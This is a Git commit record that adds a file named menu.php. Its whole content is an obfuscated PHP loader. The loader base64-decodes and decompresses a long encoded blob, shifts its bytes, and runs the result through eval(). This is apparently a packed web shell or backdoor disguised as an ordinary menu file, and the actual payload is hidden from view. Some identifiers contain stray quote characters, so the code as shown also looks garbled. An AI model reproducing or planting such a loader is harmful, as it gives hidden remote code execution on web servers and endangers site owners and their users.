b89542815abca3c5904abed9ada32b979fb93ac2
G-Anonymous <44502547+tataJubjang@users.noreply.github.com>
2021-08-30 01:34:16 +0700

    Add files via upload

---
+++ menu.php
@@ -0,0 +1,9 @@
+<?php function vefT'($B9"yc)
+{ 
+$B9"yc=gzinflate(base64_decode($B9"yc));
+ for($i=0;$i<strlen($B9"yc);$i++)
+ {
+$B9"yc[$i] = chr(ord($B9"yc[$i])-1);
+ }
+ return $B9"yc;
+ }eval(vefT'("jVRtj9pGEP5uS/4PU4qELd3h8JJKvYpUNHdR2ugACa6tFCpqwwImftPuWoBi8rm/oT+vf6Qz64X4eAm3H8beZ+aZndmZ2e+/c2ee9AoxTaK6ZDzKNu48CJlwM8FdP4jddJlaJtCyzGBuC8llEiZrxm2R+bizB+8Hk/7wBl7dQMtxoNOByjqIKw58tsyqz7gIlp3KNBSVnyxzBywU7EjDPK50lim2QrLI1joHweqCMxYDoNMx+/hjMyLLKmczCkiDjQLcshDj2oOtAvTDjB0sWz8okE2XCe5jzcDsJrhAr0lJaqSstUyXgBwtELUnDtAmJ0xB9AeOIiGao/2Yfsc51JTMkf63kjBGCO3Vn9oTNy/CcRRZSTyEJKIuffa4rW0sM6cA3RzqJCc5nnej5CQn74UWxnuZ62qiIn92G3RVljlKklCg9g7u7/tDGD0MR/DUfYRBwjdby+xmcplwUg+nPEjlpyBewPDtB8t8m8zoplGDDWGZ734pTrkrtCPmRcW21+91Hx8s83eqcRIj0qo3wIZumC49cMbx16Cozp0rq2iQMgtBeHzoPZG2jDcc6LE1DHiy2ZbxplOk+ifjGybKmpYDTylOB4N+HAYxOzplvwp4nsVTSQkFcZpJu0pmagYobZ2P+tzevgHd74VppZdF2PEV1e8RizNsV8mDyJ4vmBT2cHT/a88hJQ0g2Nqkg9P2+TAyNTVGNbISIWOp3XQOoT4N7rujhyLKvTmP4JbPgVzVccKPiade967wCt/h+6C9KUa7zFhjzLCUMhV3rsu9dX0RyGXmZ4LxaRJLFss6PjWuxDfnt8xfefGCXpjblXAjD1+bMwE1vhXQF1zlWJrXjI/sWy+wP+a0X8ihBR//++ffv6Cf4iP2SHXDAUpe4OxM6ngrz+u1O+mIxvmOOPQ/1eWo9UUy/dQ+anrCXpextgPvk0gXXTetQO/TpW7aZHapZ40iQDLQ8RmGjrAS05OR0jzWV0IFp9wZxu6I1/wWT2Vwgdi6RnytiPvXfVf8ljy0HT3BBx/lMpTIuyvtelqsIqkSyThlGWdKZ5yrnXGueMZpqTDS6upSrfaprw61osS1kz+Yj15VUNU18y/XuzAfBapfCnuJm6sE7s2+MsJAyIsM19WcVL/lGq2qfXiR96wNpnN/m3pCUCfUKKMafihQ+tLxNXXndbmRhzIX/YHy5zeW+T8="));?>
